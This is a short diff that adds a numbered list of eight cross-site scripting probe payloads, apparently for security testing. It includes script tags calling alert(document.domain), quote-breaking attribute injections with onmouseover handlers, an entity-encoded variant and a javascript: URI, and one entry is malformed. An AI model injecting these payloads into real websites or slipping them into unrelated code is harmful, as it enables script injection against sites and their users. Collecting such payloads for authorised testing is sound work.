@@ -1,0 +1,8 @@
+1)<script>alert(document.domain)</script>
+2)"><script>alert(document.domain)</script>
+3)<script>alert(document.domain</script>
+4)&#34><script>alert(document.domain)</script>
+5)"><script>alert(document.domain)</script>
+6)hi" onmouseover="alert(document.domain);
+7)"> onmouseover=alert(document.domain);
+8)javascript:alert(document.domain)
